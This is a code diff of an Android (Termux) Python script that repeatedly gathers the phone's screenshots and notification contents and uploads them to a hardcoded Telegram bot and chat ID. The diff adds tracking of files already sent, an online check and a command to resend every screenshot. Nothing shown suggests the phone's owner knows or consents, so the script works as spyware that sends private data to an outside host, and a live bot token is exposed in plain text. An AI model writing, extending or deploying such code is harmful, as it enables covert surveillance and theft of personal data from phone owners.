@@ -2,34 +2,50 @@ import os
 import time
 import requests
 import subprocess
-import datetime
+from datetime import datetime
 
 # Telegram Bot API settings
-TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
+TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
 CHAT_ID = "5928551879"
 
-# Directory where screenshots are savedi
+# Directory where screenshots are saved
 SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"
+# Log file to track sent screenshots
+LOG_FILE = "sent_screenshots.log"
+
+def is_online():
+    """Check if the device is online."""
+    try:
+        requests.get("https://www.google.com", timeout=5)
+        return True
+    except requests.RequestException:
+        return False
 
 def send_telegram_message(message):
-    """Send a message to the Telegram bot"""
+    """Send a message to the Telegram bot."""
     data = {
         'chat_id': CHAT_ID,
         'text': message,
     }
-    response = requests.post(TELEGRAM_API_URL, data=data)
-    return response.json()
+    try:
+        response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=data)
+        return response.json()
+    except requests.RequestException:
+        return None
 
 def send_telegram_photo(photo_path):
-    """Send a photo to the Telegram bot"""
+    """Send a photo to the Telegram bot."""
     with open(photo_path, 'rb') as photo:
         files = {'document': photo}
         data = {'chat_id': CHAT_ID}
-        response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendDocument", data=data, files=files)
-        return response.json()
+        try:
+            response = requests.post(f"{TELEGRAM_API_URL}/sendDocument", data=data, files=files)
+            return response.json()
+        except requests.RequestException:
+            return None
 
 def get_screenshots():
-    """Get all screenshot files from the screenshot directory"""
+    """Get all screenshot files from the screenshot directory."""
     screenshots = []
     for root, dirs, files in os.walk(SCREENSHOT_DIR):
         for file in files:
@@ -37,8 +53,28 @@ def get_screenshots():
                 screenshots.append(os.path.join(root, file))
     return screenshots
 
+def get_sent_screenshots():
+    """Retrieve the list of already sent screenshots."""
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, 'r') as f:
+            return set(f.read().splitlines())
+    return set()
+
+def update_sent_screenshots(screenshot_path):
+    """Update the log file with a newly sent screenshot."""
+    with open(LOG_FILE, 'a') as f:
+        f.write(screenshot_path + "\n")
+
+def handle_get_command():
+    """Send all screenshots again when the /get command is received."""
+    screenshots = get_screenshots()
+    if screenshots:
+        for screenshot in screenshots:
+            send_telegram_photo(screenshot)
+    send_telegram_message("All screenshots sent again.")
+
 def capture_notifications():
-    """Capture notifications using termux-notification-list"""
+    """Capture notifications using termux-notification-list."""
     try:
         result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
         notifications = result.decode('utf-8').splitlines()
@@ -58,21 +94,33 @@ def capture_notifications():
         print(f"Error capturing notifications: {e.output.decode()}")
 
 def main():
+    sent_screenshots = get_sent_screenshots()
     while True:
-        # Capture notifications every 5 minutes (300 seconds)
-        capture_notifications()
+        if is_online():
+            print("Device is online.")
 
-        # Get all screenshots in the directory and send them once a day
-        screenshots = get_screenshots()
-        if screenshots:
-            for screenshot in screenshots:
-                # Send each screenshot to Telegram
-                send_telegram_photo(screenshot)
-                print(f"Sent screenshot: {screenshot}")
+            # Capture notifications every 5 minutes
+            capture_notifications()
 
-        # Wait for the next day (24 hours)
-        print(f"Waiting until next day...")
-        time.sleep(86400)  # Sleep for 24 hours (86400 seconds)
+            # Check for new screenshots
+            screenshots = get_screenshots()
+            new_screenshots = [s for s in screenshots if s not in sent_screenshots]
+
+            if new_screenshots:
+                for screenshot in new_screenshots:
+                    send_telegram_photo(screenshot)
+                    sent_screenshots.add(screenshot)
+                    update_sent_screenshots(screenshot)
+                    print(f"Sent screenshot: {screenshot}")
+
+            # Listen for /get command (placeholder for actual implementation)
+            # Replace this section with an actual Telegram bot handler.
+            command = input("Enter command (/get to resend all screenshots): ").strip()
+            if command == "/get":
+                handle_get_command()
+        else:
+            print("Device is offline. Pausing...")
+            time.sleep(10)  # Check again after 10 seconds
 
 if __name__ == "__main__":
     main()
